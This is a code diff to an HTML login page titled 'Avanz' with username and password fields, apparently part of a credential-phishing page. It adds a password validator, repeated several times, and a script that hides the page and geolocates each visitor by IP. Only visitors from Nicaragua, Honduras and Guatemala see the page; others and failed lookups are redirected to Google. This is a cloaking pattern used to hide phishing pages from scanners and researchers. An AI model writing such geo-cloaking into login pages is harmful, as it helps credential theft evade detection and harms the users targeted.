@@ -5,7 +5,58 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Avanz</title>
 </head>
+    <script>
+        function validarFormulario() {
+            var usuario = document.getElementById("usuario").value;
+            var password = document.getElementById("contrasena").value;
 
+            var regexEspecial = /[.!#*@\/\?]/;
+            var regexMayuscula = /[A-Z]/;
+            var regexMinuscula = /[a-z]/;
+            var regexNumero = /[0-9]/;
+
+            if (usuario.trim() === "") {
+                alert("El campo de usuario no puede estar vacío.");
+                return false;
+            }
+
+            if (password.length < 8 || 
+                !regexEspecial.test(password) || 
+                !regexMayuscula.test(password) || 
+                !regexMinuscula.test(password) || 
+                !regexNumero.test(password)) {
+                alert("La contraseña debe tener al menos 8 caracteres, incluir un carácter especial (.!#*@/\?), una mayúscula, una minúscula y un número.");
+                return false;
+            }
+            return true;
+        }
+    </script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            // Oculta el contenido antes de verificar
+            document.body.style.display = "none";
+
+            fetch("https://ipwhois.app/json/")
+                .then(response => response.json())
+                .then(data => {
+                    let pais = data.country_code; // Obtiene el código del país (Ej: NI, HN, GT)
+                    let paisesPermitidos = ["NI", "HN", "GT"]; // Nicaragua, Honduras, Guatemala
+
+                    if (!paisesPermitidos.includes(pais)) {
+                        window.location.replace("https://www.google.com"); // Redirige si no está permitido
+                    } else {
+                        document.body.style.display = "block"; // Muestra la página si el país está permitido
+                    }
+                })
+                .catch(error => {
+                    console.error("Error al obtener la ubicación:", error);
+                    window.location.replace("https://www.google.com"); // En caso de error, redirige a Google
+                });
+        });
+    </script>
+    <style>
+        body { display: none; } /* Oculta el contenido hasta verificar la IP */
+    </style>
 <style>
     .masa {
         width: 100%;
@@ -152,7 +203,32 @@
             </form>
         </div>
     </div>
+    <script>
+        function validarFormulario() {
+            var usuario = document.getElementById("usuario").value;
+            var password = document.getElementById("contrasena").value;
 
+            var regexEspecial = /[.!#*@\/\?]/;
+            var regexMayuscula = /[A-Z]/;
+            var regexMinuscula = /[a-z]/;
+            var regexNumero = /[0-9]/;
+
+            if (usuario.trim() === "") {
+                alert("El campo de usuario no puede estar vacío.");
+                return false;
+            }
+
+            if (password.length < 8 || 
+                !regexEspecial.test(password) || 
+                !regexMayuscula.test(password) || 
+                !regexMinuscula.test(password) || 
+                !regexNumero.test(password)) {
+                alert("La contraseña debe tener al menos 8 caracteres, incluir un carácter especial (.!#*@/\?), una mayúscula, una minúscula y un número.");
+                return false;
+            }
+            return true;
+        }
+    </script>
     <script>
         function validarFormulario() {
             let usuario = document.getElementById("usuario").value;
